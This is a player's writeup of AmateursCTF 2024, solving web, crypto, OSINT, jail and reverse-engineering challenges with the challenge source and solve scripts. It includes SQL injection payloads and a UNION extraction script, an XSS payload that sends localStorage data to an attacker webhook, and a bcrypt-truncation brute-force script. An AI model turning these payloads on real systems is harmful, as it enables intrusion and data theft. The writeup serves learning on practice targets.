---
title: "AmateursCTF 2024"
description: "Writeup for web challenges in AmateursCTF 2024"
summary: "Writeup for web challenges in AmateursCTF 2024"
categories: ["Writeup"]
tags: ["Web Exploitation","Crypto", "Reverse Engineer","OSINT","MISC", "CTF"]
#externalUrl: ""
date: 2024-04-13
draft: false
---

<!-- .slide: style="font-size: 12px;" -->


## Overview

The CTF event: https://ctftime.org/event/2226/
I played as solo player and got the rank higher than i expected lul. I have learn a lots when playing this CTF. 
![image](https://hackmd.io/_uploads/HJr4iSUg0.png)

## Writeup
### **1. web/denied**
![image](https://hackmd.io/_uploads/SJlJ6rLgA.png)
They give me a source code `index.js` so let's take a look on that.
```javascript!=
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```
So the thing is if we use `req.method == "GET"` this returns `Bad!` so just change the method to `HEAD` using burpsuite.

![image](https://hackmd.io/_uploads/rJ3CTH8eC.png)
Flag: `amateursCTF{s0_m@ny_0ptions...}`
### 2. **osint/bathroom-break**
![image](https://hackmd.io/_uploads/S1AqArIlC.png)
They give 2 jpg image and the mission is try to find a bathroom near that place. After using google lens i found it's `Hot Creek Geologic Site` and look around the google map i found a toilet near it.
![image](https://hackmd.io/_uploads/Hk47JL8gA.png)
Click that and we will see the link [t.ly/phXhx](https://t.ly/phXhx).
Flag: `amateursCTF{jk_i_lied_whats_a_bathroom_0f9e8d7c6b5a4321}`
### **3. crypto/aesy**
![image](https://hackmd.io/_uploads/HJWmgILlA.png)
The chall gives me a key and a ciphertext and just use that to decrypt the flag.
Script to exploit:
```python!=
from Crypto.Cipher import AES
from binascii import unhexlify

key = unhexlify('8e29bd9f7a4f50e2485acd455bd6595ee1c6d029c8b3ef82eba0f28e59afcf9f')
ciphertext = unhexlify('abcdd57efb034baf82fc1920a618e6a7fa496e319b4db1746b7d7e3d1198f64f')

cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)

print(plaintext)
```
Flag: `amateursCTF{w0w_3cb_a3s_1s_fun}`

### **4. web/agile-rut**
![image](https://hackmd.io/_uploads/SJ3lzLIgC.png)

When first look the challenge, i found that they have a font file with name `agile-rut.otf`. So i think i need to analyze this file to get the flag. 

![image](https://hackmd.io/_uploads/rkymNLLeC.png)

The challenge in the begin has a unintended solve the is use strings the file to get the flag. 
![image](https://hackmd.io/_uploads/HyC_m8LxR.png)
But i found that this flag is somehow wrong when i try to submit. So i open the ticket to ask admin and know that they have changed the file. So i need to solve with intended way. After searching about openType i see [this](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_fonts/OpenType_fonts_guide).
> This is sometimes the trickiest thing to work out if you don't have any documentation that came with the fonts (many type designers and foundries will provide sample pages and CSS just for this very reason). But there are some sites that make it easier to figure out. You can visit wakamaifondue.com, drop your font file on the circle where instructed, and in a few moments you'll have a full report on all the capabilities and features of your font. Axis-praxis.org also offers a similar capability, with the ability to click on the features to turn them on or off in a given text block.

Go to the web [wakamaifondue.com](https://wakamaifondue.com) and import the file. You will see the flag.
![image](https://hackmd.io/_uploads/rkKvH8IxA.png)

If you noticed they just change flag that the word `CTF` to lowercase.
Flag: `amateursctf{0k_but_1_dont_like_the_jbmon0_===}`

### **5. web/one-shot**
![image](https://hackmd.io/_uploads/SkayU8Ue0.png)

The source code:
```python!=
from flask import Flask, request, make_response
import sqlite3
import os
import re

app = Flask(__name__)
db = sqlite3.connect(":memory:", check_same_thread=False)
flag = open("flag.txt").read()

@app.route("/")
def home():
    return """
    <h1>You have one shot.</h1>
    <form action="/new_session" method="POST"><input type="submit" value="New Session"></form>
    """

@app.route("/new_session", methods=["POST"])
def new_session():
    id = os.urandom(8).hex()
    db.execute(f"CREATE TABLE table_{id} (password TEXT, searched INTEGER)")
    password = os.urandom(16).hex()
    db.execute(f"INSERT INTO table_{id} VALUES ('{password}', 0)")
    print(password)
    res = make_response(f"""
    <h2>Fragments scattered... Maybe a search will help?</h2>
    <form action="/search" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="query" value="">
        <input type="submit" value="Find">
    </form>
""")
    res.status = 201

    return res

@app.route("/search", methods=["POST"])
def search():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    searched = db.execute(f"SELECT searched FROM table_{id}").fetchone()[0]
    if searched:
        return "you've used your shot."
    
    db.execute(f"UPDATE table_{id} SET searched = 1")

    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
    print(query.fetchall())
    return f"""
    <h2>Your results:</h2>
    <ul>
    {"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
    </ul>
    <h3>Ready to make your guess?</h3>
    <form action="/guess" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="password" placehoder="Password">
        <input type="submit" value="Guess">
    </form>
"""

@app.route("/guess", methods=["POST"])
def guess():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    result = db.execute(f"SELECT password FROM table_{id} WHERE password = ?", (request.form['password'],)).fetchone()
    if result != None:
        return flag
    
    return "You failed. <a href='/'>Go back</a>"

@app.errorhandler(500)
def ise(error):
    original = getattr(error, "original_exception", None)
    if type(original) == sqlite3.OperationalError and "no such table" in repr(original):
        return "that table is gone. <a href='/'>Go back</a>"
    return "Internal server error"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

This challenge has 3 way to solve and i solve with the easiest way. 
* First method:
> The first method is inject the id in route `guess` to bypass `WHERE password = ?`. Because the regex just check if the not the id with 16 length and match with `1234567890abcdef` it will return "invalid id". So just input the right id and send the payload after that. 
![image](https://i.ibb.co/V2KxwmL/image-2024-04-13-112055544.png)
> Payload: `id = id WHERE 1=1 OR 1=?--&password=test`
* Second method: 
> First, i create the session and use intercept in burpsuite to catch the id table. So they can not update the table id or drop it. Then create a new session and use that to inject to this query. `query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")` That the payload is inject to the query and brute force the table's password that i create at the first time. And create a new session to brute force until get the password and use that to get the password with the first table's id and get the flag. This just the idea after i solve by the 1st method so i do not build a full script for this.
> Payload: `query = a' OR SUBSTR((SELECT password FROM table_{created_table}),{i},1)='{char};--'
* Third method (The intended way):
>`{"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}`
> As you can see in the source code, it just show the first character of password. So what if union with each character of the password using substring ?

Exploit script:

```python!=
import requests
from bs4 import BeautifulSoup

url = "http://one-shot.amt.rs"

payload = "'% "
for i in range(1, 32):
    payload += f"UNION ALL SELECT SUBSTR(password, {1+1}) || SUBSTR(password, 1, {i}) FROM table_{id}"
    payload += "--"
data = {
"id": id, # input the id of the table
"query": payload
}

response = requests.post(url+'/search', data=data)
soup = BeautifulSoup (response.text, 'html.parser')
passwords = ''.join([li.text[0] for li in soup.find_all('li')])
print(passwords)
```

Flag: `amateursCTF{go_union_select_a_life}`

### **6. osint/cherry-blossoms**

![image](https://i.ibb.co/G3HgcTt/image-2024-04-13-113321113.png)

This chall gives me a image to find the coords of this image and nc to the server and give the coords to get the flag.
After search and using the image to look around i found that many American flags are placed in a circle is the specific characteristic to find where the place is. And i found that is Washington Monument. And the final step is go around in google maps and take the right coords. 
![image](https://i.ibb.co/Z6dKrf2/image-2024-04-13-113349848.png)
Flag: `amateursCTF{l00k1ng_l0v3ly_1n_4k}`

### **7. jail/sansomega**
![image](https://i.ibb.co/TW5PpZY/image-2024-04-13-113406029.png)
The source code: 
```python!=
#!/usr/local/bin/python3
import subprocess

BANNED = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\\\"'`:{}[]"


def shell():
    while True:
        cmd = input("$ ")
        if any(c in BANNED for c in cmd):
            print("Banned characters detected")
            exit(1)

        if len(cmd) >= 20:
            print("Command too long")
            exit(1)

        proc = subprocess.Popen(
            ["/bin/sh", "-c", cmd], stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )

        print(proc.stdout.read().decode("utf-8"), end="")


if __name__ == "__main__":
    shell()
```

They block all uppercase and lowercase letters, along with some special characters. As the first time i thought using italized characters to write expressions. But after try a lot i found that this using python:3.10 although the trick italized characters just use for  python 3.7. So i read the source carefully and see that they do not block these `/*.?` or number. So i try to use that to solve the challenge. And i found it.
![image](https://i.ibb.co/fpDNnmW/image-2024-04-13-113414862.png)

Flag: `amateursCTF{pic0_w45n7_g00d_n0ugh_50_i_700k_som3_cr34t1v3_l1b3rt135_ade8820e}`

### **8. rev/typo**

![image](https://i.ibb.co/D9FnjVb/image-2024-04-13-113422046.png)

The challenge give me a file `mian.py` ? It's make me confuse because the variable they name so complex so i need to change the source to see it easily lul.
Source code (After change):
```python!=
import random as lib
seed = int('1665663c', 20)
lib.seed(seed)
var = bytearray(open('flag.txt', 'rb').read())
var_1 = '\r'r'\r''r''\\r'r'\\r\r'r'r''r''\\r'r'r\r'r'r\\r''r'r'r''r''\\r'r'\\r\r'r'r''r''\\r'r'rr\r''\r''r''r\\'r'\r''\r''r\\\r'r'r\r''\rr'
arr = [
    b'arRRrrRRrRRrRRrRr',
    b'aRrRrrRRrRr',
    b'arRRrrRRrRRrRr',
    b'arRRrRrRRrRr',
    b'arRRrRRrRrrRRrRR'
    b'arRRrrRRrRRRrRRrRr',
    b'arRRrrRRrRRRrRr',
    b'arRRrrRRrRRRrRr'
    b'arRrRrRrRRRrrRrrrR',
]
var_2 = lambda num: bytearray([num_1 + 1 for num_1 in num])
var_3 = lambda num: bytearray([num_1 - 1 for num_1 in num])
def foo(hex):
    for id in range(0, len(hex) - 1, 2):
        hex[id], hex[id + 1] = hex[id + 1], hex[id]
    for list in range(1, len(hex) - 1, 2):
        hex[list], hex[list + 1] = hex[list + 1], hex[list]
    return hex
var_4 = [foo, var_2, var_3]
var_4 = [lib.choice(var_4) for num_1 in range(128)]
def lib(arr, ar):
    for r in ar:
        arr = var_4[r](arr)
    return arr

def foo(arr, ar):
    ar = int(ar.hex(), 17)
    for r in arr:
        ar += int(r, 35)
    return bytes.fromhex(hex(ar)[2:])

var_5 = lib(var, var_1.encode())
var_5 = foo(arr, var_5)
print(var_5.hex())
```

I do not play Reverse Engineer much so i just do bottom up and reverse the function to recover the flag.
Script:
```python!=
import random as lib
seed = int('1665663c', 20)
lib.seed(seed)
arr = [
    b'arRRrrRRrRRrRRrRr',
    b'aRrRrrRRrRr',
    b'arRRrrRRrRRrRr',
    b'arRRrRrRRrRr',
    b'arRRrRRrRrrRRrRR'
    b'arRRrrRRrRRRrRRrRr',
    b'arRRrrRRrRRRrRr',
    b'arRRrrRRrRRRrRr'
    b'arRrRrRrRRRrrRrrrR',
]

var = b"Hoghi`hUahUhU%YSf`7[:](bSS']ggSY\`)'Zq(XS`g`+dag"



var_2 = lambda num: bytearray([num_1 - 1 for num_1 in num])
var_3 = lambda num: bytearray([num_1 + 1 for num_1 in num])
def foo(hex):
    for list in range(1, len(hex) - 1, 2):
        hex[list], hex[list + 1] = hex[list + 1], hex[list]
    for id in range(0, len(hex) - 1, 2):
        hex[id], hex[id + 1] = hex[id + 1], hex[id]

    return hex
var_4 = [foo, var_2, var_3]
var_4 = [lib.choice(var_4) for num_1 in range(128)]

def lib(arr, ar):
    for r in ar[::-1]:
        arr = var_4[r](arr)
    return arr

var_1 = '\r'r'\r''r''\\r'r'\\r\r'r'r''r''\\r'r'r\r'r'r\\r''r'r'r''r''\\r'r'\\r\r'r'r''r''\\r'r'rr\r''\r''r''r\\'r'\r''\r''r\\\r'r'r\r''\rr'    


print(lib(var, var_1.encode()))

var_5 = int("5915f8ba06db0a50aa2f3eee4baef82e70be1a9ac80cb59e5b9cb15a15a7f7246604a5e456ad5324167411480f893f97e3",16)
def foo(hex):
    for id in range(0, len(hex) - 1, 2):
        hex[id], hex[id + 1] = hex[id + 1], hex[id]
    for list in range(1, len(hex) - 1, 2):
        hex[list], hex[list + 1] = hex[list + 1], hex[list]
    return hex

def lib(arr, ar):
    for r in ar:
        arr = var_4[r](arr)
    return arr

def foo(arr, ar):
    for r in arr:
        ar -= int(r, 35)
    print(ar)

foo(arr, var_5)

# var_5 = int(x, 16)
# var_5 -= int(r, 35)
```

Flag: `amateursCTF{4t_l3ast_th15_fl4g_isn7_misspelll3d}`

### **9. web/sculpture**

![image](https://i.ibb.co/pXr1SMR/image-2024-04-13-113434978.png)

Source code:
Index.html
```html!=
<html> 
<head> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js" type="text/javascript"></script> 
<script src="https://skulpt.org/js/skulpt.min.js" type="text/javascript"></script> 
<script src="https://skulpt.org/js/skulpt-stdlib.js" type="text/javascript"></script> 

</head> 

<body> 

<script type="text/javascript"> 
// output functions are configurable.  This one just appends some text
// to a pre element.
function outf(text) { 
    var mypre = document.getElementById("output"); 
    mypre.innerHTML = mypre.innerHTML + text; 
} 
function builtinRead(x) {
    if (Sk.builtinFiles === undefined || Sk.builtinFiles["files"][x] === undefined)
            throw "File not found: '" + x + "'";
    return Sk.builtinFiles["files"][x];
}

// Here's everything you need to run a python program in skulpt
// grab the code from your textarea
// get a reference to your pre element for output
// configure the output function
// call Sk.importMainWithBody()
function runit() { 
   var prog = document.getElementById("yourcode").value; 
   var mypre = document.getElementById("output"); 
   mypre.innerHTML = ''; 
   Sk.pre = "output";
   Sk.configure({output:outf, read:builtinRead}); 
   (Sk.TurtleGraphics || (Sk.TurtleGraphics = {})).target = 'mycanvas';
   var myPromise = Sk.misceval.asyncToPromise(function() {
       return Sk.importMainWithBody("<stdin>", false, prog, true);
   });
   myPromise.then(function(mod) {
       console.log('success');
   },
       function(err) {
       console.log(err.toString());
   });
}

document.addEventListener("DOMContentLoaded",function(ev){
    document.getElementById("yourcode").value = atob((new URLSearchParams(location.search)).get("code"));
    runit();
});

</script> 

<h3>Try This</h3> 
<form> 
<textarea id="yourcode" cols="40" rows="10">import turtle

t = turtle.Turtle()
t.forward(100)

print "Hello World" 
</textarea><br /> 
<button type="button" onclick="runit()">Run</button> 
</form> 
<pre id="output" ></pre> 
<!-- If you want turtle graphics include a canvas -->
<div id="mycanvas"></div> 

</body> 

</html> 
```
Admin-bot-excerpt.js
```javascript!=
// bot powered by the redpwn admin bot ofc
['sculpture', {
    name: 'sculpture',
    timeout: 10000,
    handler: async (url, ctx) => {
      const page = await ctx.newPage()
      console.log(await page.browser().version());
      await page.goto("https://amateurs-ctf-2024-sculpture-challenge.pages.dev/", { timeout: 3000, waitUntil: 'domcontentloaded' })
      await sleep(1000);
      await page.evaluate(() => {
        localStorage.setItem("flag", "amateursCTF{fak3_flag}")
      })
      await sleep(1000);
      console.log("going to " + url)
      await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' })
      await sleep(1000)
    },
    urlRegex: /^https:\/\/amateurs-ctf-2024-sculpture-challenge\.pages\.dev/,
}]
```

This code provides a web interface to run Python code using [Skulpt](https://skulpt.org), so what is Skulpt ?
> Skulpt is a system that compiles Python (of the 3.7-ish variety) into Javascript. But it's not Javascript that you can paste in to your browser and run. Python and Javascript are very different languages, their types are different, their scoping rules are different. Python is designed to be run on Linux, or Windows, or Mac OS X, not in the browser! So, to provide a True Python experience Skulpt must provide a runtime environment in which the compiled code executes. This runtime environment is provided by the skulpt.min.js and skulpt-stdlib.js files that you must include in your web page in order to make Skulpt work.

So the point is skulpt runs a python code and compiles into javascript. Here is a example:

![image](https://i.ibb.co/8rKVVqj/image-2024-04-13-113444566.png)

Total 165 lines to Javascript for just a simple `print("hello world")`. Sounds crazy lul. But the point is that it runs a python code and shows the output using pre element to display the results. And they also give the bot (typical XSS challenge). So what if we print something like `<script>alert()</script>` ?

![image](https://i.ibb.co/TBYbW2J/image-2024-04-13-113453318.png)

But it not alert anything. It seems weird althought it show in elements. After searching google i see [this blog](https://stackoverflow.com/questions/14158252/avoid-xss-with-an-html-tag-like-pre). It would be escaped because filter or sanitizer so just put `</pre>` in the begin right ? But it do not work even though i try to escape it. But wait, am i missing something ? Do i just only have tag `<script>` that raise XSS vuln ? How about `<img> , <iframe> , <svg>` tag ? 

![image](https://i.ibb.co/K5CP8hv/image-2024-04-13-113458993.png)

And yes it works so let just build xss payload. Payload: `print("<img src=x onerror=window.location.href='<YOUR WEBHOOK>?flag='+localStorage.getItem('flag')>")`
```javascript!=
document.addEventListener("DOMContentLoaded",function(ev){
    document.getElementById("yourcode").value = atob((new URLSearchParams(location.search)).get("code"));
    runit();
});
```
The last thing you need to do is encode your payload to base64 in put it with param code to send to admin.

![image](https://i.ibb.co/kMQC08n/image-2024-04-13-113507124.png)

Flag: `amateursCTF{i_l0v3_wh3n_y0u_can_imp0rt_xss_v3ct0r}`

### **10. osint/wumpus-leaks**

![image](https://i.ibb.co/48JDCDB/image-2024-04-13-113513868.png)

The challenge gives me a image looks like the flag is in that image. But it hide behind the msfrog. And they also give the channel id and the message id. And the image name `IMG_7276.jpg`. 

![image](https://i.ibb.co/bvdgYR2/image-2024-04-13-113519856.png)

The point is need to find the image that locate in `cdn.discordapp`. The url looks like `https://cdn.discordapp.com/attachments/1098086661847535719/1226012804150984754/IMG_7276.jpg`. But after a try and also brute around the number image it just shows `This content is no longer available.` so i read how discord store data and i found [this one](https://www.reddit.com/r/DataHoarder/comments/16zs1gt/cdndiscordapp_links_will_expire_breaking/). 

**Details about authentication parameters**

> ex: timestamp indicating when the attachment URL will expire, after which point you'd need to retrieve another URL (by doing something like retrieving a message via HTTP). More details to come about the length of time this will be by default.
> 
> is: timestamp indicating when the URL was issued
> 
> hm: unique signature that remains valid until ex.

So it add the param to prevent other to access the file outside the discord. But what if i bring it back to discord app but another channel ? And i see this comment.

![image](https://i.ibb.co/3B46d8Z/image-2024-04-13-113525577.png)

And yes this word after i try to read back the number file. And the true image is `https://cdn.discordapp.com/attachments/1098086661847535719/1226012804150984754/IMG_7262.jpg`

![image](https://i.ibb.co/FVx0Cv8/image-2024-04-13-113532458.png)

Flag: `amateursCTF{s1gn1ng_a1nt_g0nna_st0p_0ur_brut3}`

### **11. web/creative-login-page-challenge**

![image](https://i.ibb.co/D44hjfw/image-2024-04-13-113539154.png)

Source code:
```javascript!=
package team.amateurs.loginpage;

import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.core.io.Resource;
import org.springframework.core.io.ResourceLoader;
import org.springframework.http.MediaType;
import org.springframework.security.crypto.bcrypt.BCrypt;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.web.bind.annotation.*;

import javax.print.attribute.standard.Media;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.util.Base64;
import java.util.HashMap;

@SpringBootApplication
@RestController
public class LoginpageApplication {
    HashMap<String, String> users = new HashMap<String, String>();
    @Autowired
    public ResourceLoader resourceLoader;
    private final static String SALT = BCrypt.gensalt();
    // Some fun things to include in your username/password!
    // TODO take from env cause yes
    public String flag = System.getenv("FLAG");
    public String randomNum = Integer.toString((int) (Math.random() * 100));
	// add more

    public static void main(String[] args) {
        SpringApplication.run(LoginpageApplication.class, args);
    }

    @GetMapping("/")
    public String getRoot(HttpServletResponse response) {
        try {
            response.sendRedirect("/register");
            return "Redirecting";
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    @PostMapping("/register")
    public String postRegister(HttpServletResponse response, @RequestParam(value = "username") String username, @RequestParam(value = "password") String password) {
        try {
            if (username.isEmpty() || password.isEmpty()) return "No empty field";
            String tUsername = template(username);
            if (tUsername.contains(flag)) return "No flag >:( !";
            String tPassword = template(password);
            if (users.get(tUsername) != null) return "Username already taken!";
            users.put(tUsername, BCrypt.hashpw(tPassword, SALT));
            Cookie usernameCookie = new Cookie("username", Base64.getEncoder().encodeToString(tUsername.getBytes()));
            response.addCookie(usernameCookie);
            // yeah, sue me
            Cookie tokenCookie = new Cookie("token", BCrypt.hashpw(users.get(tUsername), SALT));
            response.addCookie(tokenCookie);
            response.sendRedirect("/hello");
            return "Redirecting";
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    @GetMapping(value = "/register", produces = MediaType.TEXT_HTML_VALUE)
    public String getRegister() throws IOException {
        return resourceLoader.getResource("classpath:static/register.html").getContentAsString(Charset.defaultCharset());
    }

    @GetMapping("/hello")
    public String getHello(HttpServletResponse response, @CookieValue(value = "username", required = false) String username, @CookieValue(value = "token", required = false) String token) throws IOException {
        if (token == null || username == null) {
            response.sendRedirect("/login");
            return "Redirecting";
        }

        String decodedName = new String(Base64.getDecoder().decode(username));

        if (token.equals(BCrypt.hashpw(users.get(decodedName), SALT))) {
            return "Hello " + decodedName;
        } else {
            response.sendRedirect("/login");
            return "Redirecting";
        }
    }

    @PostMapping("/login")
    public String postLogin(HttpServletResponse response, @RequestParam(value = "username") String username, @RequestParam(value = "password") String password) {
        try {
            String actual = users.get(username);
            if (actual == null) return "Credentials wrong";

            String input = BCrypt.hashpw(password, SALT);
            if (input.equalsIgnoreCase(actual)) {
                Cookie usernameCookie = new Cookie("username", Base64.getEncoder().encodeToString(username.getBytes()));
                response.addCookie(usernameCookie);
                // yeah, sue me
                Cookie tokenCookie = new Cookie("token", BCrypt.hashpw(actual, SALT));
                response.addCookie(tokenCookie);

                response.sendRedirect("/hello");
                return "Redirecting";
            }
            response.setStatus(401);
			return "Credentials wrong";
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    @GetMapping(value = "/login", produces = MediaType.TEXT_HTML_VALUE)
    public String getLogin() throws IOException {
        return resourceLoader.getResource("classpath:static/login.html").getContentAsString(Charset.defaultCharset());
    }

    private String template(String fmtStr) throws Exception {
        StringBuilder sb = new StringBuilder();
        while (fmtStr.contains("{{")) {
            int start = fmtStr.indexOf("{{") + 2;
            int end = fmtStr.indexOf("}}", start);
            if (end == -1) throw new Exception("Invalid Format String");
            sb.append(fmtStr, 0, start - 2);
            Field f = LoginpageApplication.class.getField(fmtStr.substring(start, end));
            if (f.getType().equals(String.class)) {
                sb.append(f.get(this));
            } else {
                throw new Exception("Field not found");
            }

            fmtStr = fmtStr.substring(end + 2);
        }
        // no format strings, no need.
        sb.append(fmtStr);
        return sb.toString();
    }

}
```

Let breakdown the code:

* @GetMapping("/"): Handles GET requests to the root path (/). It redirects the user to the registration page (/register).
* @PostMapping("/register"): Handles POST requests to the registration page.
* @GetMapping(value = "/register", produces = MediaType.TEXT_HTML_VALUE): Handles GET requests to the registration page. It retrieves the registration HTML file from a static location and returns its content.
* @GetMapping("/hello"): Handles GET requests to the hello page. It checks for username and token cookies.
* @PostMapping("/login"): Handles POST requests to the login page. It performs user login.
* @GetMapping(value = "/login", produces = MediaType.TEXT_HTML_VALUE): Handles GET requests to the login page. It retrieves the login HTML file from a static location and returns its content.

The template method seems to be a custom function that performs string interpolation using double curly braces `({{}})`. It retrieves values from class fields with matching names. However, its implementation has security vulnerabilities as it doesn't properly validate field types or access restrictions. So that we can input `{{flag}}` to get the flag. 
```java!=
public String flag = System.getenv("FLAG");
```
The idea that i use to solve is [this one](https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length/184090#184090). 

> However, there is a considerable amount of confusion on the actual limit. Some people believe that the "56 bytes" limit includes a 4-byte salt, leading to a lower limit of 51 characters. Other people point out that the algorithm, internally, manages things as 18 32-bit words, for a total of 72 bytes, so you could go to 71 characters (or even 72 if you don't manage strings with a terminating zero).

So the maximum length of the bcrypt password is 72 bytes. so the idea is i register with 72 bytes minus length of the flag and login with the string that we get that is the flag. For example:
`amateursCTF{a`, `amateursCTF{b` and so on. If they match with the flag i register that is the next character of the flag.

The exploit script:

```python!=
import requests
import string
import os

url = "http://creative-login-page.amt.rs"

s = "amateursCTF{"
# s = "amateursCTF{1_l0v3_l0gin_pAges}"

username = os.urandom(16).hex()
while True:
    for c in string.ascii_letters + string.digits + "_-}":
        s += c
        pass_register = "i" * (72 - len(s)) + '{{flag}}'
        pass_login = "i" * (72 - len(s)) + s
        res_register = requests.post(url + "/register", data={"username": username, "password": pass_register})
        res_login = requests.post(url + "/login", data={"username": username, "password": pass_login})
        if "Hello" in res_login.text:
            username = os.urandom(16).hex()
            print("[+] Flag brute force success: ", s)
            continue
            if "}" in s:
                print("[+] Flag: ", s)
                break
        else:
            s = s[:-1]
```

The flow exploit is:
> - First register with 72 characters long with the password `"i" * (72 - len(s)) + '{{flag}}'`
> - And login with 72 characters long with the password `"i" * (72 - len(s)) + s` with s is flag prefix.
> - If the pass can login that the flag is correct. so just move on the next char (need to create a new username), i use `username = os.urandom(16).hex()` to generate a new one. And so on.

![image](https://i.ibb.co/D9Cx0BX/image-2024-04-13-113549173.png)

Flag: `amateursCTF{1_l0v3_l0gin_pAges}`